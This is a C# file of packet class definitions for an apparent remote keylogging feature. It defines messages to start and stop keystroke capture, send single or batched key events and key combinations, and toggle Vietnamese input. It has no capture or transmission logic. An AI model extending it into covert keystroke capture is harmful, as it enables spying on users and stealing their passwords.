using Common.Enums;
using Common.Models;

namespace Common.Networking
{
    public sealed class KeyLoggerStart : BasePacket
    {
        public KeyLoggerStart()
        {
            PacketType = PacketType.KeyLoggerStart;
        }
        public KeyLoggerStartPayload Payload { get; set; } = new KeyLoggerStartPayload();
    }

    public sealed class KeyLoggerStop : BasePacket
    {
        public KeyLoggerStop()
        {
            PacketType = PacketType.KeyLoggerStop;
        }
    }

    public sealed class KeyLoggerEvent : BasePacket
    {
        public KeyLoggerEvent()
        {
            PacketType = PacketType.KeyLoggerEvent;
        }
        public KeyLoggerEventPayload Payload { get; set; } = new KeyLoggerEventPayload();
    }

    public sealed class KeyLoggerBatch : BasePacket
    {
        public KeyLoggerBatch()
        {
            PacketType = PacketType.KeyLoggerBatch;
        }
        public KeyLoggerBatchPayload Payload { get; set; } = new KeyLoggerBatchPayload();
    }

    public sealed class KeyLoggerComboEvent : BasePacket
    {
        public KeyLoggerComboEvent()
        {
            PacketType = PacketType.KeyLoggerComboEvent;
        }
        public KeyLoggerComboPayload Payload { get; set; } = new KeyLoggerComboPayload();
    }

    public sealed class KeyLoggerLangToggle : BasePacket
    {
        public KeyLoggerLangToggle()
        {
            PacketType = PacketType.KeyLoggerLangToggle;
        }
        public bool Vietnamese { get; set; }
    }
}


